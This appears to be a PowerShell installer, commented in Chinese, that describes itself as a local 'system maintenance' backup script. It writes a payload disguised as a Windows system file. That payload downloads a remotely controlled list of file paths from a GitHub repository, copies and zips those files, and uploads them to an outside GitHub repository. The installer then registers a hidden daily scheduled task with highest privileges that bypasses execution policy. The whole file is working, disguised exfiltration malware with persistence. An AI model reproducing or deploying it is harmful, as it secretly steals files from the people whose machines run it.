# install.ps1 - 安装嵌入上传逻辑的本地维护脚本 + 注册计划任务

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# 维护任务名称与脚本路径（可自定义）
$scriptFileName = "system-maintainer.ps1"
$scriptPath = "C:\ProgramData\Microsoft\Windows\$scriptFileName"
$taskName = "SystemMaintenanceTask"
$taskTime = "23:00"

# ✅ 嵌入完整上传逻辑的主脚本内容
$scriptContent = @'
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$repo = "rtyuiuiop/1"
$token = $env:GITHUB_TOKEN
$tag = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$apiUrl = "https://api.github.com/repos/$repo/releases"
$pathListUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"

try {
    $paths = Invoke-WebRequest -Uri $pathListUrl -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
    $paths = $paths -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    Write-Host "✅ 成功获取路径列表："
    $paths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Warning "❌ 无法获取路径配置文件：$($_.Exception.Message)"
    exit 1
}

$workDir = "$env:TEMP\backup_$tag"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

foreach ($path in $paths) {
    if (Test-Path $path) {
        try {
            $relative = $path -replace "^[A-Z]:\\", "" -replace "[:\\]", "_"
            $dest = Join-Path $workDir $relative
            New-Item -ItemType Directory -Path (Split-Path $dest) -Force -ErrorAction SilentlyContinue | Out-Null
            Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Warning "⚠️ 无法复制：$path"
        }
    } else {
        Write-Warning "❌ 路径不存在：$path"
    }
}

$zipPath = "$env:TEMP\$tag.zip"
Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force

$releaseBody = @{
    tag_name   = $tag
    name       = "Backup $tag"
    body       = "自动上传的备份文件"
    draft      = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "Content-Type" = "application/json"
}

try {
    $response = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method Post -Body $releaseBody
    if ($response.upload_url) {
        $uploadUrl = $response.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"
        $uploadHeaders = @{
            Authorization = "token $token"
            "Content-Type" = "application/zip"
        }
        Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -InFile $zipPath
        Write-Host "`n✅ 上传成功：$tag.zip"
    } else {
        Write-Host "❌ 创建 Release 失败：$($response | ConvertTo-Json -Depth 5)"
    }
} catch {
    Write-Warning "❌ 上传过程出错：$($_.Exception.Message)"
}

Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
'@

# 写入主脚本
try {
    New-Item -ItemType Directory -Path (Split-Path $scriptPath) -Force | Out-Null
    $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force
    Write-Host "✅ 主脚本已写入：$scriptPath"
} catch {
    Write-Error "❌ 写入失败：$($_.Exception.Message)"
    exit 1
}

# 注册计划任务
try {
    $arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    schtasks /Create /TN $taskName /TR "powershell.exe $arguments" /SC DAILY /ST $taskTime /RL HIGHEST /F | Out-Null
    Write-Host "📅 任务 [$taskName] 已注册，每天 $taskTime 执行"
} catch {
    Write-Warning "⚠️ 注册任务失败：$($_.Exception.Message)"
}

Write-Host "`n✅ 部署完成。"
